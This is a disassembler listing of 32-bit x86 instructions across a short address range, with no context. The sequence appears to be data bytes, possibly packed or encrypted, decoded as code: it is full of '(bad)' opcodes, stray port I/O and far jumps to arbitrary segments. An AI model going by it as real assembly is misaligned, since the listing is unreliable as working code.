  4134df:	mov    esi,0x96eedffa
  4134e4:	pop    esp
  4134e5:	and    DWORD PTR [ecx+0x50ab3208],0xc67ab1c3
  4134ef:	aad    0x37
  4134f1:	leave  
  4134f2:	int    0xc1
  4134f4:	mov    bh,0xc4
  4134f6:	jae    0x4134ed
  4134f8:	sbb    BYTE PTR [ebx],dl
  4134fa:	es in  eax,0x48
  4134fd:	out    0x18,eax
  4134ff:	out    dx,al
  413500:	pop    edi
  413501:	or     BYTE PTR [esi-0x1ae4c2a2],bl
  413507:	mov    ds:0x452c4285,eax
  41350c:	leave  
  41350d:	mov    ebx,0xe9b92b21
  413512:	push   0xffffffe7
  413514:	sub    DWORD PTR [ebp+0x166d7d69],0x8fbe7329
  41351e:	mov    ecx,0x18ee3446
  413523:	jnp    0x4134b1
  413525:	push   es
  413526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413527:	mov    WORD PTR [esi+0x5b],cs
  41352a:	push   0xffffffd6
  41352c:	pop    ds
  41352d:	push   cs
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	lock in eax,0x3f
  413532:	sub    ebx,esp
  413534:	in     eax,dx
  413535:	fdivrp st(2),st
  413537:	rcr    bh,1
  413539:	fistp  QWORD PTR [edi-0x5e]
  41353c:	retf   0xefd
  41353f:	push   ebp
  413540:	std    
  413541:	jbe    0x41357f
  413543:	xor    esp,DWORD PTR [eax-0x500a1a25]
  413549:	mov    eax,0x44f4bc6b
  41354e:	imul   eax,DWORD PTR [edi],0x5ac2acff
  413554:	scas   al,BYTE PTR es:[edi]
  413555:	pop    edi
  413556:	shr    BYTE PTR [edi+0x6c],0x48
  41355a:	iret   
  41355b:	dec    ecx
  41355c:	mov    ds:0x49ae1c21,eax
  413561:	cmp    DWORD PTR [ebx-0x5a],0xfffffff0
  413565:	ins    DWORD PTR es:[edi],dx
  413566:	imul   eax,esi,0xec85bb4f
  41356c:	shr    BYTE PTR [edi],1
  41356e:	(bad)  
  41356f:	scas   al,BYTE PTR es:[edi]
  413570:	scas   eax,DWORD PTR es:[edi]
  413571:	lods   al,BYTE PTR ds:[esi]
  413572:	push   ebx
  413573:	fdivr  st,st(7)
  413575:	(bad)  
  413576:	mov    ds:0x7202f6d1,eax
  41357b:	jo     0x4135d3
  41357d:	mul    DWORD PTR [esi-0x52]
  413580:	dec    eax
  413581:	and    al,BYTE PTR [eax+0x89e6629]
  413587:	and    al,0xad
  413589:	ja     0x41350f
  41358b:	pop    esi
  41358c:	jg     0x413585
  41358e:	pushf  
  41358f:	cs xor al,0xe8
  413592:	mov    esi,esp
  413594:	data16 jne 0x413578
  413597:	enter  0x1f1a,0xc5
  41359b:	push   esi
  41359c:	test   BYTE PTR [ebx-0x5228ba72],dh
  4135a2:	fild   DWORD PTR ds:0x2ad0ca82
  4135a8:	out    dx,al
  4135a9:	add    al,0x5c
  4135ab:	add    esp,esi
  4135ad:	inc    esp
  4135ae:	cs and eax,0xabce8fe3
  4135b4:	lods   al,BYTE PTR ds:[esi]
  4135b5:	pop    esp
  4135b6:	shl    BYTE PTR [ecx+0x3d05b2fa],0x73
  4135bd:	test   eax,0x843cd841
  4135c2:	fsub   QWORD PTR [ebx+0x77]
  4135c5:	jl     0x4135ea
  4135c7:	jmp    0x4135bb
  4135c9:	ds ret 
  4135cb:	fisub  WORD PTR [eax-0x5f]
  4135ce:	mov    ds:0x5dc62492,al
  4135d3:	jns    0x413610
  4135d5:	mov    eax,0x628eedc1
  4135da:	shl    DWORD PTR [edx-0x6e6e54ce],1
  4135e0:	add    DWORD PTR [esi+0x79],edx
  4135e3:	mov    edx,DWORD PTR [edx+0x72fd0a3a]
  4135e9:	pushf  
  4135ea:	fs stos DWORD PTR es:[edi],eax
  4135ec:	fcomp  DWORD PTR [eax]
  4135ee:	rol    DWORD PTR [eax+edi*8],0x64
  4135f2:	xor    ebp,DWORD PTR [edx+eiz*1+0x14]
  4135f6:	stos   DWORD PTR es:[edi],eax
  4135f7:	xchg   edx,eax
  4135f8:	and    dl,BYTE PTR [ecx-0x570b5123]
  4135fe:	pop    edi
  4135ff:	add    DWORD PTR [ecx+0x68c7519d],0x89fe4762
  413609:	pop    es
  41360a:	jp     0x4135c8
  41360c:	in     al,0xc0
  41360e:	retf   0xb847
  413611:	push   ds
  413612:	mov    edx,0x73210b1d
  413617:	mov    ch,cl
  413619:	mov    bh,0x4d
  41361b:	xchg   ecx,eax
  41361c:	jle    0x41360e
  41361e:	push   ss
  41361f:	icebp  
  413620:	adc    al,0x5e
  413622:	fwait
  413623:	cmp    ecx,DWORD PTR [eax+0x2618d3ae]
  413629:	scas   eax,DWORD PTR es:[edi]
  41362a:	cmp    eax,DWORD PTR [esp+ebp*1]
  41362d:	lahf   
  41362e:	sbb    dh,BYTE PTR [edi]
  413630:	adc    dl,dl
  413632:	push   esp
  413633:	xor    edi,DWORD PTR [edi-0x45e81058]
  413639:	push   edi
  41363a:	jnp    0x4135d1
  41363c:	dec    ebp
  41363d:	pop    es
  41363e:	xor    BYTE PTR [ecx],dh
  413640:	or     DWORD PTR [ebx-0x6280951f],esp
  413646:	clc    
  413647:	test   esp,esp
  413649:	dec    eax
  41364a:	sbb    eax,0xdbb888ed
  41364f:	test   BYTE PTR [ebx-0x73a98ef6],0x62
  413656:	mov    ch,0xb3
  413658:	and    al,0x63
  41365a:	inc    edi
  41365b:	xor    bl,BYTE PTR [esi+0x66bde543]
  413661:	pop    edi
  413662:	mov    BYTE PTR [edi+0x6],bl
  413665:	dec    esi
  413666:	or     eax,0x2a1abcac
  41366b:	outs   dx,BYTE PTR ds:[esi]
  41366c:	mov    edx,0xb9966fce
  413671:	xchg   ebx,eax
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	jle    0x413649
  413675:	mov    bl,0xdb
  413677:	dec    edx
  413678:	mov    ah,0x1e
  41367a:	mov    dl,0x20
  41367c:	sbb    eax,0xb789b653
  413681:	xor    DWORD PTR [edi-0x2f693a4b],eax
  413687:	mov    ebx,0xe093a6fd
  41368c:	mov    ah,BYTE PTR [esi]
  41368e:	adc    ebx,DWORD PTR [edx+ebx*4-0x6b285baa]
  413695:	rcr    DWORD PTR [eax],1
  413697:	or     eax,0x504076df
  41369c:	inc    ebx
  41369d:	repnz sar DWORD PTR [eax],cl
  4136a0:	sti    
  4136a1:	xor    DWORD PTR [eax-0x6e6a2c6e],ebx
  4136a7:	push   ss
  4136a8:	scas   al,BYTE PTR es:[edi]
  4136a9:	pop    esp
  4136aa:	xchg   ebp,eax
  4136ab:	mov    dh,0x4f
  4136ad:	jo     0x4136e9
  4136af:	cmp    ecx,ebx
  4136b1:	leave  
  4136b2:	inc    ecx
  4136b3:	dec    eax
  4136b4:	call   0xf643:0xb8784f68
  4136bb:	pop    ebx
  4136bc:	mov    bl,0xcc
  4136be:	je     0x413719
  4136c0:	mov    edx,0xf63380d2
  4136c5:	push   eax
  4136c6:	in     eax,dx
  4136c7:	dec    ecx
  4136c8:	icebp  
  4136c9:	adc    eax,0xc5f51382
  4136ce:	es xchg BYTE PTR cs:[edi-0x5c3aed30],dl
  4136d6:	xor    bh,BYTE PTR [esi+0x3d]
  4136d9:	out    dx,al
  4136da:	test   eax,0xce33277d
  4136df:	fs add al,0xad
  4136e2:	jl     0x413704
  4136e4:	call   0xe8bc:0x8a26b44
  4136eb:	mov    al,ds:0x55a3d668
  4136f0:	add    al,0xe3
  4136f2:	int3   
  4136f3:	add    DWORD PTR [edx+ebx*8+0x5c2ec9a3],ebp
  4136fa:	pop    eax
  4136fb:	mov    dh,bl
  4136fd:	cmp    dl,BYTE PTR [esi-0x6ef8c040]
  413703:	cdq    
  413704:	jno    0x413723
  413706:	out    0xaf,al
  413708:	adc    eax,0xc76d203f
  41370d:	shl    BYTE PTR [edx],1
  41370f:	add    DWORD PTR [ebx+0x88f494e],0x32
  413716:	call   0x2c5e:0x17b09345
  41371d:	je     0x413754
  41371f:	push   ss
  413720:	ret    
  413721:	sbb    dh,BYTE PTR [eax-0x19]
  413724:	cld    
  413725:	adc    al,BYTE PTR [ebx]
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	or     bl,bl
  41372a:	lods   al,BYTE PTR ds:[esi]
  41372b:	cmp    ecx,ebp
  41372d:	scas   al,BYTE PTR es:[edi]
  41372e:	pop    esi
  41372f:	cmp    DWORD PTR [eax+0x55ff6ee2],edx
  413735:	out    0x84,al
  413737:	mov    ds:0xc0402a49,eax
  41373c:	cdq    
  41373d:	pop    edi
  41373e:	in     eax,dx
  41373f:	fisub  WORD PTR [ebp-0x583ea382]
  413745:	add    ch,al
  413747:	mov    ds:0x5ddf0cc8,eax
  41374c:	xor    ch,ah
  41374e:	inc    eax
  41374f:	test   BYTE PTR [ebx],al
  413751:	ret    
  413752:	(bad)  
  413753:	jecxz  0x413771
  413755:	inc    esp
  413756:	scas   al,BYTE PTR es:[edi]
  413757:	int    0x87
  413759:	xor    dh,dl
  41375b:	les    eax,FWORD PTR [ebp+0x46]
  41375e:	rol    edi,1
  413760:	inc    eax
  413761:	icebp  
  413762:	out    0x22,eax
  413764:	and    dl,dl
  413766:	mov    gs,WORD PTR [ecx+0x5b]
  413769:	cld    
  41376a:	inc    ebx
  41376b:	or     bh,BYTE PTR [esi+esi*4-0x1d]
  41376f:	pop    edx
  413770:	sbb    DWORD PTR [esi+0x27],0xffffffbf
  413774:	in     al,dx
  413775:	loop   0x41375b
  413777:	aas    
  413778:	sar    BYTE PTR [eax+esi*1],cl
  41377b:	das    
  41377c:	aam    0xa6
  41377e:	pushf  
  41377f:	nop
  413780:	test   BYTE PTR [ebp+ebx*2-0x78],dl
  413784:	push   0x2ce2fe65
  413789:	or     esp,DWORD PTR [eax-0x1596f909]
  41378f:	xchg   ecx,eax
  413790:	mov    ch,cl
  413792:	and    edx,ecx
  413794:	daa    
  413795:	pop    edi
  413796:	push   cs
  413797:	xchg   ebp,eax
  413798:	popa   
  413799:	add    eax,DWORD PTR cs:[esi+0x4eb6137a]
  4137a0:	sahf   
  4137a1:	pop    esi
  4137a2:	push   0x70
  4137a4:	cmp    BYTE PTR [edi],bl
  4137a6:	cmp    DWORD PTR [eax],0xffffffff
  4137a9:	sbb    cl,bl
  4137ab:	fistp  DWORD PTR [edi-0xdeae106]
  4137b1:	shl    eax,0xbc
  4137b4:	retf   0x3abf
  4137b7:	pop    ds
  4137b8:	mov    eax,ds:0xe9fc6bcb
  4137bd:	cs push es
  4137bf:	dec    eax
  4137c0:	and    eax,0x7bc2384e
  4137c5:	sbb    al,0xad
  4137c7:	add    al,0x43
  4137c9:	(bad)  
  4137cb:	nop
  4137cc:	mov    eax,0x382ba133
  4137d1:	arpl   WORD PTR [eax],di
  4137d3:	cld    
  4137d4:	mov    ah,0x98
  4137d6:	in     al,dx
  4137d7:	xor    eax,0x98a18bc3
  4137dc:	sbb    ebx,edi
  4137de:	and    ch,0x93
  4137e1:	mov    WORD PTR [ecx+0x546743bf],ds
  4137e7:	push   ebx
  4137e8:	mov    ebx,0xb29369e4
  4137ed:	mov    edx,0x4f1d9f91
  4137f2:	stos   DWORD PTR es:[edi],eax
  4137f3:	push   cs
  4137f4:	lods   eax,DWORD PTR ds:[esi]
  4137f5:	sub    BYTE PTR ds:0x9b1b11fa,dh
  4137fb:	push   esi
  4137fc:	retf   
  4137fd:	sar    DWORD PTR [eax-0x7c6046cf],1
  413803:	jecxz  0x4137ae
  413805:	out    0x3d,al
  413807:	ja     0x4137f7
  413809:	aaa    
  41380a:	jno    0x41381a
  41380c:	pushf  
  41380d:	ds (bad) 
  413810:	and    DWORD PTR [ebx],esp
  413812:	sub    ecx,DWORD PTR [eax+0x430db41]
  413818:	dec    ebx
  413819:	outs   dx,DWORD PTR ds:[esi]
  41381a:	or     al,0xd8
  41381c:	sbb    DWORD PTR [edi],ebx
  41381e:	and    DWORD PTR [eax+0x527d94df],edi
  413824:	or     edx,edi
  413826:	adc    edi,esi
  413828:	sub    dh,BYTE PTR [eax+0x7ec3c721]
  41382e:	adc    dl,cl
  413830:	xor    al,0x12
  413832:	loopne 0x4137c3
  413834:	fidiv  WORD PTR [edi]
  413836:	test   ebx,ebx
  413838:	test   eax,0xf4038bb0
  41383d:	xor    al,BYTE PTR [edi]
  41383f:	sbb    DWORD PTR [edi-0x5],0x7ad1b14c
  413846:	add    ah,BYTE PTR [eax-0x13ff0ed4]
  41384c:	in     eax,0x7
  41384e:	add    bh,BYTE PTR [esi]
  413850:	loope  0x413854
  413852:	pmullw mm2,QWORD PTR [eax+ebx*4-0x258be126]
  41385a:	inc    ecx
  41385b:	push   esi
  41385c:	jle    0x41381f
  41385e:	inc    esi
  41385f:	mov    esi,0x8700c586
  413864:	fisttp WORD PTR ds:0x666ed953
  41386a:	repnz stc 
  41386c:	sahf   
  41386d:	lea    ebp,[ecx]
  41386f:	sub    DWORD PTR [ecx-0x7],ecx
  413872:	pop    esp
  413873:	xchg   ecx,eax
  413874:	mov    DWORD PTR [edx+0x28],edi
  413877:	aaa    
  413878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413879:	call   0x34f8:0xe4dbb2ec
  413880:	and    DWORD PTR [ebp+0x69f3f811],eax
  413886:	es mov cl,0x42
  413889:	jne    0x413887
  41388b:	gs mov ecx,0x9879d065
  413891:	xchg   ebp,eax
  413892:	pop    cx
  413894:	test   BYTE PTR [ebx-0x3473071],dh
  41389a:	sbb    BYTE PTR gs:[esi+esi*8-0x3df079d0],bl
  4138a2:	inc    edi
  4138a3:	dec    edi
  4138a4:	jmp    0x7db2:0xb1fde07f
  4138ab:	xor    DWORD PTR [edi-0x3a],0x9480ff99
  4138b2:	dec    edi
  4138b3:	add    ah,BYTE PTR [edx-0x48ee91d9]
  4138b9:	bnd je 0x413871
  4138bc:	xor    eax,0x696dd52f
  4138c1:	pop    ecx
  4138c2:	mov    ds:0x1ab4de2d,al
  4138c7:	pop    esi
  4138c8:	imul   edi,DWORD PTR [ecx-0x502577d8],0xef535a4
  4138d2:	pop    ds
  4138d3:	xchg   bp,ax
  4138d5:	cmp    DWORD PTR [eax+0x6ba2e430],ecx
  4138db:	xchg   ecx,eax
  4138dc:	retf   
  4138dd:	or     ch,BYTE PTR [ecx-0x4afc102d]
  4138e3:	sar    BYTE PTR [ecx-0x79340fe6],0x3
  4138ea:	dec    esi
  4138eb:	neg    DWORD PTR [edx]
  4138ed:	dec    eax
  4138ee:	jne    0x41396e
  4138f0:	int3   
  4138f1:	out    dx,eax
  4138f2:	xor    BYTE PTR [ecx+0x25],cl
  4138f5:	pop    ebx
  4138f6:	jp     0x413908
  4138f8:	ret    0x86a1
  4138fb:	dec    esi
  4138fc:	shr    BYTE PTR [ebp+0x2675be22],0xd9
  413903:	dec    edx
  413904:	xor    eax,0xb3354842
  413909:	dec    ebp
  41390a:	or     ecx,DWORD PTR [edx-0x3c]
  41390d:	cli    
  41390e:	push   eax
  41390f:	mov    edx,0x44231235
  413914:	loopne 0x413927
  413916:	or     DWORD PTR [ebx],edx
  413918:	lsl    eax,WORD PTR [eax-0xe9bd96c]
  41391f:	cli    
  413920:	fs jo  0x4138ab
  413923:	std    
  413924:	loop   0x41394b
  413926:	jmp    0x9cdbb50b
  41392b:	dec    ecx
  41392c:	cmp    al,ch
  41392e:	test   eax,0x3417f1d0
  413933:	xchg   edx,eax
  413934:	out    dx,al
  413935:	les    edx,FWORD PTR [eax-0xa]
  413938:	jmp    0xcee:0x5c991ab2
  41393f:	push   ebp
  413940:	mov    DWORD PTR [ebx],eax
  413942:	jnp    0x41393b
  413944:	mov    ch,0xfe
  413946:	and    edx,DWORD PTR [edi+0xe]
  413949:	mov    esp,0xf6c85a14
  41394e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41394f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413951:	shr    BYTE PTR [edx],cl
  413953:	popf   
  413954:	adc    eax,0x1c370841
  413959:	rcl    bh,1
  41395b:	or     edi,ecx
  41395d:	pusha  
  41395e:	(bad)  
  41395f:	js     0x413906
  413961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413962:	aam    0xda
  413964:	retf   
  413965:	in     eax,dx
  413966:	add    esi,DWORD PTR ds:0x56e0e80f
  41396c:	nop
  41396d:	xor    eax,0xcf43dee0
  413972:	xchg   DWORD PTR [edi-0x67a8721d],edx
  413978:	not    BYTE PTR ds:0x5b451beb
  41397e:	shl    BYTE PTR [eax+0x65243021],0xa
  413985:	and    DWORD PTR [ebx-0x36c0573b],0x31
  41398c:	std    
  41398d:	call   FWORD PTR ds:[ebp+0x7896be22]
  413994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413996:	cmp    eax,DWORD PTR [ebx-0x18]
  413999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41399a:	test   BYTE PTR [ebx+0x51f0290f],ah
  4139a0:	jmp    DWORD PTR ds:0x2329537d
  4139a6:	bound  ebx,QWORD PTR [esi+0x61c2d724]
  4139ac:	pop    edx
  4139ad:	mov    esi,esp
  4139af:	jnp    0x41395a
  4139b1:	popf   
  4139b2:	xchg   ebx,eax
  4139b3:	push   cs
  4139b4:	pop    es
  4139b5:	call   FWORD PTR [eax+ebp*8-0x3776f3d2]
  4139bc:	inc    edi
  4139bd:	mov    al,ds:0x6325b2e8
  4139c2:	sub    DWORD PTR [edx+0x1e],ebx
  4139c5:	ss js  0x4139a2
  4139c8:	jo     0x4139ba
  4139ca:	imul   eax,DWORD PTR [ecx+0x2],0x79
  4139ce:	and    al,0xa5
  4139d0:	std    
  4139d1:	cli    
  4139d2:	inc    edi
  4139d3:	add    ch,BYTE PTR [edi+0x1a]
  4139d6:	hlt    
  4139d7:	pop    ecx
  4139d8:	fisttp WORD PTR [ebp+0x78b604d0]
  4139de:	ret    
  4139df:	adc    eax,0x12f1827d
  4139e4:	mov    edx,0xed0ba754
  4139e9:	loop   0x413a61
  4139eb:	(bad)  
  4139ec:	pusha  
  4139ed:	ficom  WORD PTR [esi+0x4f649c27]
  4139f3:	mov    ebp,DWORD PTR [esi-0x63d92a33]
  4139f9:	rcr    BYTE PTR [ebx+0xe],1
  4139fc:	jmp    0x413a22
  4139fe:	inc    edi
  4139ff:	hlt    
  413a00:	into   
  413a01:	mov    edx,0xe948d30a
  413a06:	repnz inc ecx
  413a08:	sbb    BYTE PTR [ebp+0x76],cl
  413a0b:	and    al,0x80
  413a0d:	mov    BYTE PTR [edx+eax*8+0xc5ca470],ah
  413a14:	mov    ecx,0xb68d5ed6
  413a19:	iret   
  413a1a:	sub    BYTE PTR [ebp-0x52],ch
  413a1d:	int3   
  413a1e:	sbb    ch,BYTE PTR [esi]
  413a20:	inc    edx
  413a21:	or     ch,BYTE PTR [edx+0x502fa6e7]
  413a27:	add    eax,0x7b7718fc
  413a2c:	aaa    
  413a2d:	ror    dl,cl
  413a2f:	cwde   
  413a30:	loopne 0x4139f3
  413a32:	or     eax,ebp
  413a34:	sbb    al,0x16
  413a36:	pop    edx
  413a37:	les    edx,FWORD PTR [esi]
  413a39:	int3   
  413a3a:	adc    DWORD PTR [ecx],edi
  413a3c:	lds    ebp,FWORD PTR [edx-0x1c]
  413a3f:	jno    0x413a77
  413a41:	cmp    esp,DWORD PTR [ebx]
  413a43:	jmp    0x413abc
  413a45:	add    eax,0xe2015efe
  413a4a:	mov    eax,0x6e85e556
  413a4f:	into   
  413a50:	fwait
  413a51:	adc    DWORD PTR [edi],edi
  413a53:	imul   ebx,esp,0x94ded517
  413a59:	aad    0xf1
  413a5b:	test   BYTE PTR [ecx+0x6aa6434a],0xad
  413a62:	mov    bh,0x96
  413a64:	push   ecx
  413a65:	sub    DWORD PTR [edx+0x15],ebp
  413a68:	test   ebx,esi
  413a6a:	test   DWORD PTR ds:0xd0145c06,ebp
  413a70:	and    DWORD PTR [edx+0x65b787b2],esp
  413a76:	dec    edi
  413a77:	jecxz  0x413acc
  413a79:	xchg   DWORD PTR [eax],esi
  413a7b:	mov    bh,0x15
  413a7d:	mov    ds:0x89283d0b,eax
  413a82:	sahf   
  413a83:	ret    0x4cb9
  413a86:	ret    0x6e9
  413a89:	adc    edi,DWORD PTR [edi]
  413a8b:	or     ch,al
  413a8d:	mov    ah,BYTE PTR [ebx+ecx*4]
  413a90:	enter  0x29e7,0xb6
  413a94:	cmp    esi,esi
  413a96:	push   0x5
  413a98:	jo     0x413acd
  413a9a:	(bad)  
  413a9b:	jmp    0x413b00
  413a9d:	and    BYTE PTR [esi+0x1f],dl
  413aa0:	rol    DWORD PTR [esi+eax*8],1
  413aa3:	add    al,0x12
  413aa5:	pop    ss
  413aa6:	or     DWORD PTR ds:0xd8006f92,0x59
  413aad:	sub    al,0xb5
  413aaf:	sbb    BYTE PTR [ebx],bl
  413ab1:	out    0x2e,eax
  413ab3:	dec    esi
  413ab4:	scas   eax,DWORD PTR es:[edi]
  413ab5:	(bad)  
  413ab6:	pop    ecx
  413ab7:	push   ebx
  413ab8:	mov    eax,0xd333720
  413abd:	sbb    ch,BYTE PTR [ebx+ecx*4]
  413ac0:	cs dec ecx
  413ac2:	push   edx
  413ac3:	lea    edx,[ebp+0x6f4562c8]
  413ac9:	outs   dx,DWORD PTR ds:[esi]
  413aca:	into   
  413acb:	(bad)  
  413acc:	bound  eax,QWORD PTR [edi+edx*2]
  413acf:	int    0xac
  413ad1:	pop    esi
  413ad2:	div    DWORD PTR [ecx+ecx*8]
  413ad5:	push   ebp
  413ad6:	xchg   esp,edx
  413ad8:	std    
  413ad9:	ret    
  413ada:	popf   
  413adb:	or     edx,DWORD PTR ds:0xc3a51bcd
  413ae1:	adc    dh,dl
  413ae3:	lds    esi,FWORD PTR [edi]
  413ae5:	pop    esi
  413ae6:	stc    
  413ae7:	xor    dh,al
  413ae9:	lock mov esi,0xba53b683
  413aef:	(bad)  
  413af0:	cwde   
  413af1:	pop    edx
  413af2:	mov    edi,0xb98fb868
  413af7:	adc    eax,0x34846ce1
  413afc:	je     0x413af0
  413afe:	add    al,0x56
  413b00:	xchg   ecx,eax
  413b01:	or     eax,0xb5e77b15
  413b06:	xchg   edi,eax
  413b07:	call   0x2bee:0xed0fe652
  413b0e:	ins    BYTE PTR es:[edi],dx
  413b0f:	mov    esi,0xcc6805a7
  413b14:	(bad)  
  413b16:	jbe    0x413b6d
  413b18:	cmp    al,0xd4
  413b1a:	pop    ds
  413b1b:	stos   DWORD PTR es:[edi],eax
  413b1c:	add    al,0x64
  413b1e:	fucomi st,st(2)
  413b20:	jne    0xb49b089b
  413b26:	dec    ecx
  413b27:	fwait
  413b28:	(bad)  
  413b29:	dec    edx
  413b2a:	out    0x1e,al
  413b2c:	test   ebx,ecx
  413b2e:	outs   dx,DWORD PTR ds:[esi]
  413b2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b30:	in     al,0x50
  413b32:	ret    
  413b33:	call   0xfb49:0x3305993e
  413b3a:	mov    eax,ds:0xcc746232
  413b3f:	jmp    0x462af842
  413b44:	icebp  
  413b45:	cmp    ecx,ebx
  413b47:	inc    esi
  413b48:	jp     0x413ad8
  413b4a:	lock and edx,DWORD PTR [eax]
  413b4d:	mov    DWORD PTR [edx-0x62c8b6fb],ecx
  413b53:	loop   0x413b83
  413b55:	mov    ah,0x1
  413b57:	test   BYTE PTR [ecx+0x357686ec],dh
  413b5d:	nop
  413b5e:	adc    esi,esp
  413b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b62:	addr16 push edi
  413b64:	call   0x58acbaeb
  413b69:	clc    
  413b6a:	lock rol DWORD PTR [edx],cl
  413b6d:	cmp    DWORD PTR [esi-0x5a],esp
  413b70:	iret   
  413b71:	or     al,0x5a
  413b73:	dec    ebp
  413b74:	pop    ebx
  413b75:	mov    ecx,0xbb95c4b7
  413b7a:	jl     0x413be5
  413b7c:	aad    0x5f
  413b7e:	and    DWORD PTR [eax+0x34434c32],edx
  413b84:	and    BYTE PTR ds:0xbfb7cd96,bh
  413b8a:	pop    ss
  413b8b:	sbb    ch,BYTE PTR [edi-0x5ea72152]
  413b91:	fdiv   QWORD PTR [edi]
  413b93:	stos   BYTE PTR es:[edi],al
  413b94:	rcl    DWORD PTR gs:[ebp+0x6f7d2810],cl
  413b9b:	mov    ecx,0xd789cad
  413ba0:	adc    al,0x75
  413ba2:	sbb    BYTE PTR [esi],ah
  413ba4:	or     DWORD PTR [eax],ebx
  413ba6:	lahf   
  413ba7:	lods   eax,DWORD PTR ds:[esi]
  413ba8:	js     0x413b4b
  413baa:	or     eax,0x1cf24aaa
  413baf:	and    BYTE PTR gs:[esi+0x29f8639c],bl
  413bb6:	scas   eax,DWORD PTR es:[edi]
  413bb7:	mov    esi,0x37bd36d4
  413bbc:	add    BYTE PTR [edi-0x6a],ah
  413bbf:	shr    BYTE PTR [ebx],0xa5
  413bc2:	rol    BYTE PTR fs:[eax+0x35dd42ba],0xd8
  413bca:	mov    bl,0x76
  413bcc:	mov    al,0xfa
  413bce:	or     al,0x93
  413bd0:	jbe    0x413c41
  413bd2:	outs   dx,BYTE PTR ds:[esi]
  413bd3:	ss neg esi
  413bd6:	inc    ecx
  413bd7:	mov    ecx,0x54ed1b05
  413bdc:	(bad)  
  413bdd:	pushf  
  413bde:	test   BYTE PTR [edx-0x67103587],cl
  413be4:	aad    0x3b
  413be6:	mov    eax,ds:0x110e6e47
  413beb:	jb     0x413b7d
  413bed:	mov    ?,WORD PTR [ebx]
  413bef:	add    bh,BYTE PTR [esi-0x75]
  413bf2:	dec    ebx
  413bf3:	push   esp
  413bf4:	int    0xc2
  413bf6:	aam    0x9e
  413bf8:	jne    0x413b84
  413bfa:	neg    esp
  413bfc:	pusha  
  413bfd:	fsubr  QWORD PTR [edi+0x72]
  413c00:	inc    esp
  413c01:	mov    ds:0xf4f87342,eax
  413c06:	sub    ebx,ecx
  413c08:	pop    ebp
  413c09:	pushf  
  413c0a:	push   ds
  413c0b:	in     al,0xbe
  413c0d:	sub    DWORD PTR [ebp-0x5f],eax
  413c10:	pop    DWORD PTR [ebx-0x4d1f69dd]
  413c16:	adc    DWORD PTR [edi],ebx
  413c18:	mov    DWORD PTR [ebp+0x41147b8c],esp
  413c1e:	test   BYTE PTR [esi-0x8ea7bc0],al
  413c24:	jmp    0x2682:0xb221742a
  413c2b:	mov    ecx,0x6bf15683
  413c30:	out    0x8f,eax
  413c32:	mov    ds:0x777a6b70,al
  413c37:	jecxz  0x413be6
  413c39:	arpl   cx,cx
  413c3b:	mov    ds:0xfd2d195,eax
  413c40:	xor    al,0xd7
  413c42:	fsubr  st,st(1)
  413c44:	cmp    esp,DWORD PTR [edx+0x6875fd2b]
  413c4a:	cmp    al,0x38
  413c4c:	bnd jg 0x413c01
  413c4f:	pusha  
  413c50:	pop    esp
  413c51:	popa   
  413c52:	in     eax,dx
  413c53:	stos   BYTE PTR es:[edi],al
  413c54:	cmp    al,BYTE PTR ss:[edx]
  413c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c58:	(bad)  
  413c59:	(bad)  
  413c5a:	inc    ecx
  413c5b:	imul   edx,ebp,0xffffff89
  413c5e:	imul   ecx,ebx,0x50
  413c61:	shl    BYTE PTR [ebp-0x390b2c9a],1
  413c67:	dec    ebx
  413c68:	lock int3 
  413c6a:	mov    ch,0xeb
  413c6c:	in     al,0x70
  413c6e:	dec    esi
  413c6f:	jno    0x413c95
  413c71:	out    dx,al
  413c72:	pop    ss
  413c73:	adc    al,0xa0
  413c75:	idiv   DWORD PTR [ecx]
  413c77:	out    0xaf,al
  413c79:	dec    eax
  413c7a:	(bad)
  413c7d:	mov    esi,0x8a03aad9
  413c82:	ins    DWORD PTR es:[edi],dx
  413c83:	xchg   DWORD PTR [ebp+0x70f356ad],ecx
  413c89:	in     eax,dx
  413c8a:	adc    dh,BYTE PTR [esi+0x17]
  413c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c8e:	sub    al,0xc
  413c90:	mov    dl,0x4
  413c92:	xchg   ecx,eax
  413c93:	dec    esi
  413c94:	xchg   bh,ch
  413c96:	shr    BYTE PTR [edx-0x40],1
  413c99:	and    eax,0x935e09cd
  413c9e:	into   
  413c9f:	fimul  DWORD PTR [esi]
  413ca1:	inc    ebp
  413ca2:	pop    ds
  413ca3:	jg     0x413c26
  413ca5:	jecxz  0x413cdf
  413ca7:	add    eax,0x16253e3d
  413cac:	lods   eax,DWORD PTR ds:[esi]
  413cad:	jmp    0x6f72:0x5acc581e
  413cb4:	int3   
  413cb5:	std    
  413cb6:	cmc    
  413cb7:	xlat   BYTE PTR ds:[ebx]
  413cb8:	cld    
  413cb9:	inc    edx
  413cba:	aam    0x4e
  413cbc:	fistp  DWORD PTR [eax-0x66472542]
  413cc2:	imul   esi,DWORD PTR [edx+0x27],0xf676887f
  413cc9:	inc    ecx
  413cca:	add    edx,0x53
  413ccd:	xchg   edx,eax
  413cce:	leave  
  413ccf:	dec    eax
  413cd0:	addr16 pop eax
  413cd2:	mov    esp,0x5da8c179
  413cd7:	call   0xca74035d
  413cdc:	push   ss
  413cdd:	gs jnp 0x413d2a
  413ce0:	pop    esi
  413ce1:	es and eax,0x4455a8b8
  413ce7:	fnstenv ds:0xaa7145b
  413ced:	inc    edi
  413cee:	imul   edi,DWORD PTR [ecx+0x1c240f22],0xb4a3407b
  413cf8:	push   edi
  413cf9:	cmp    BYTE PTR [esi-0x55],0xde
  413cfd:	push   ebp
  413cfe:	jo     0x413cba
  413d00:	xchg   ebp,eax
